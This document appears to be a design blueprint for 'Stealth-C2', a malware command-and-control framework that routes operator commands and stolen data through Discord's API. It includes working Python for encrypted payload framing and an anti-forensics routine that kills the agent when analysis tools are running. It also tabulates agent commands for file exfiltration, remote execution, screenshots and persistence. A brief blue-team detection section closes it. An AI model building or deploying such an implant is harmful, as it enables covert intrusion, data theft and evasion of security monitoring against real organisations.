# 🛰️ Stealth-C2 v1.0 Architectural Blueprint

> **Author**: Haridev P  
> **Source Code**: [github.com/haridevp/Stealth-C2](https://github.com/haridevp/Stealth-C2)  
> **Classification**: Offensive Security Research & Adversary Simulation

---

### Threat Model & Design Goals

Traditional C2 infrastructures face immediate detection by Next-Generation Firewalls (NGFWs), Deep Packet Inspection (DPI), and DNS reputation scoring when an unknown domain or suspicious VPS IP address is contacted.

**Stealth-C2** was engineered from the ground up to operate in hostile, heavily-monitored corporate network environments with three core objectives:
1. **Total Egress Legitimacy**: Route all command, control, and exfiltration streams through trusted cloud endpoints (`https://discord.com/api/v10/`) utilizing legitimate TLS certificates.
2. **End-to-End Cryptographic Privacy**: Encrypt all payloads client-side with **AES-256-GCM** so neither intermediate proxies nor the SaaS provider itself can inspect the operator instructions.
3. **Automated Forensic Evasion**: Integrated environmental sandbox checks that trigger an emergency in-memory kill-switch if analysis tools are active.

```text
[Operator Terminal]
       │
       ▼  Discord REST API (HTTPS/443)
[Discord Gateway CDN (discord.com)]
       │
       ▼  HTTPS Long-Polling / Webhooks
[Stealth-C2 Agent (Compromised Endpoint)]
       ├── 1. Survey Environment (Check for Wireshark, ProcMon, x64dbg)
       ├── 2. Decrypt Inbound JSON (AES-256-GCM + 96-bit IV + 128-bit Tag)
       ├── 3. Execute Instruction via Subprocess (No cmd.exe spawned)
       └── 4. Encrypt Output -> Multi-part Webhook Post
```

---

### Cryptographic Framing: AES-256-GCM

Every transmission frame between the operator console and the agent is serialized into a structured JSON envelope containing authentication tags and nonces:

```json
{
  "marker": "STEALTH-C2-v1",
  "emoji_tag": "⚡",
  "iv": "a9f3b2c1e8471029c564d2e1",
  "ciphertext": "Yk93SmdlV0xTdm5xT1Bsa3lq...",
  "auth_tag": "e481b99201f8ca3199bc113941fe0a81"
}
```

#### Python Cryptographic Implementation

```python
import os
import json
import base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

class SecureConduit:
    def __init__(self, key_bytes: bytes):
        """256-bit symmetric session key."""
        assert len(key_bytes) == 32
        self.aesgcm = AESGCM(key_bytes)

    def encrypt_payload(self, plaintext: str, emoji_code: str = "⚡") -> str:
        # Generate fresh 96-bit random IV for every single packet
        iv = os.urandom(12)
        encoded_data = plaintext.encode('utf-8')
        
        # Encrypt and authenticate
        ciphertext_with_tag = self.aesgcm.encrypt(iv, encoded_data, None)
        
        # Split tag (last 16 bytes) and ciphertext
        ciphertext = ciphertext_with_tag[:-16]
        tag = ciphertext_with_tag[-16:]

        packet = {
            "emoji": emoji_code,
            "iv": iv.hex(),
            "ciphertext": base64.b64encode(ciphertext).decode('utf-8'),
            "tag": tag.hex()
        }
        return json.dumps(packet)

    def decrypt_payload(self, packet_json: str) -> str:
        data = json.loads(packet_json)
        iv = bytes.fromhex(data["iv"])
        ciphertext = base64.b64decode(data["ciphertext"])
        tag = bytes.fromhex(data["tag"])

        # AES-GCM expects ciphertext concatenated with the 16-byte authentication tag
        decrypted_bytes = self.aesgcm.decrypt(iv, ciphertext + tag, None)
        return decrypted_bytes.decode('utf-8')
```

---

### Steganographic Command Protocol

Rather than sending obvious ASCII shell strings, operator instructions are mapped to standard chat emojis:

| Emoji | Instruction | Operational Function |
| :--- | :--- | :--- |
| `🐚` | `sysinfo` | Queries OS version, architecture, active user, and domain joining status. |
| `📸` | `screenshot` | Native screen capture; converts buffer to in-memory AES-encrypted attachment. |
| `📂` | `exfil <path>` | Reads targeted file, encrypts locally, and uploads as multi-part message. |
| `⚡` | `exec <cmd>` | Executes process via `subprocess` API without invoking interactive `cmd.exe`. |
| `🔄` | `persist` | Establishes startup registry key or user systemd service. |
| `🔑` | `rotate-key` | Generates a new AES-256 session key and archives the old key with a timestamp. |
| `🛑` | `kill` | Emergency self-destruct: memory overwrite and silent exit. |

---

### Defensive Kill-Switch & Anti-Forensics

Before executing any high-privilege command or decoding payload buffers, the agent enumerates active processes and environment variables. If known monitoring or debugging tools are present, the agent executes an emergency shutdown:

```python
import sys
import psutil

BLACKLISTED_PROCESSES = {
    "wireshark.exe", "tshark.exe", "procmon.exe", "procmon64.exe",
    "procexp.exe", "x64dbg.exe", "x32dbg.exe", "ida.exe", "ida64.exe",
    "pestudio.exe", "cuckoomon.dll"
}

def verify_environment_safety(session_buffer: bytearray) -> bool:
    """Detects forensic analysis tools and zeroes memory if threatened."""
    for proc in psutil.process_iter(['name']):
        try:
            pname = proc.info['name'].lower()
            if pname in BLACKLISTED_PROCESSES:
                # ZERO SENSITIVE MEMORY IMMEDIATELY
                for i in range(len(session_buffer)):
                    session_buffer[i] = 0
                
                # Terminate silently with normal exit code 0 to avoid crash-dump telemetry
                sys.exit(0)
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return True
```

---

### Blue Team Hunting & Detection Directives

> [!TIP]
> 1. **Process-Network Correlation**: Alert on non-browser and non-Discord processes (e.g. `python.exe`, unverified binaries) establishing persistent TLS connections to `discord.com` or `gateway.discord.gg`.
> 2. **High-Frequency REST Calls**: Inspect web proxy logs for repetitive, small HTTPS `POST` requests to `/api/v10/channels/*/messages`.
> 3. **Encrypted Egress Volume**: Track anomalous outbound payload uploads from standard workstations to consumer chat CDNs.
